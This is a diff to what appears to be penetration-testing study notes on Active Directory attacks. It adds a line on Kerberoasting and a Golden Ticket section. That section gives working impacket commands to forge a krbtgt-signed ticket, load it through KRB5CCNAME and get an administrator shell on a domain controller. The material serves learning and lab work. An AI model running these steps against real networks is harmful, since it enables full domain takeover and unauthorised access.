@@ -254,7 +254,7 @@ Mitigating Against Pass Attacks:
 
 ## Kerberoasting:
 
-* Quick way to get domain admin/service account privileges in a network using a compromised valid domain login.
+* Quick way to get domain admin/service account privileges in a network using a compromised valid domain login. You don't need a privileged user's credentials for this. 
 * A quick summary of the steps:
 
 1. Request a TGT (Ticket Granting Ticket) from the Domain Controller (our Key Distribution Centre - KDC) by providing an NTLM hash. Any user on the domain can request this, so use any compromised credentials.
@@ -396,6 +396,34 @@ root@kali:~# netexec/crackmapexec smb [Target IP] -d [Domain] -u [Username] -p [
 This works because Windows tries to resolve the target path of a shortcut and this can only be done by contacting the remote SMB path. This means even if the user never clicks on it, as long as they go to the directory where it's stored, Windows will send authentication metadata, potentially NTLM hashes in an attempt to do an SMB connection attempt.&#x20;
 {% endhint %}
 
+***
+
+## Golden Ticket:
+
+* Forged a ticket that's signed with krbtgt service account's hash. Specifically this one - it's the KDC's service account.
+* If you have this, you can create a ticket for and impersonate any user - not just administrator. This means full domain compromise. 
+* When this ticket is decrypted by the DC, the attacker can have unrestricted access to anything in the domain.
+
+
+1. Create a TGT claiming to be administrator. Will create a CCache (Credential Cache) file storing the TGT claiming to be the administrator.
+
+```shellscript
+root@kali:~# python ticketer.py -nthash [KRBTGT Hash] -domain-sid [Domain SID] -domain spookysec.local administrator
+```
+
+2. Export the ticket. This tells Kerberos to use the ticket stored in the standard location KRB5CCNAME where legitimate Kerberos tickets would be stored otherwise.
+
+```shellscript
+root@kali:~# export KRB5CCNAME=./administrator.ccache
+```
+
+3. Use the ticket. Will result in an admin shell. Signature looks valid to the DC (signed with the krbtgt account hash) so it will be accepted completely. 
+
+```shellscript
+root@kali:~# psexec.py -k -no-pass [Domain]/[Username - in this case, administrator]@[DC IP]
+```
+
+
 
 
 ***
@@ -410,3 +438,6 @@ This works because Windows tries to resolve the target path of a shortcut and th
 2. Once quick wins are exhausted, enumerate and dig deeper (e.g., BloodHound, where does account have access.
 3. Think outside the box.
 4. Move laterally until you can move vertically and compromise the domain.&#x20;
+
+
+
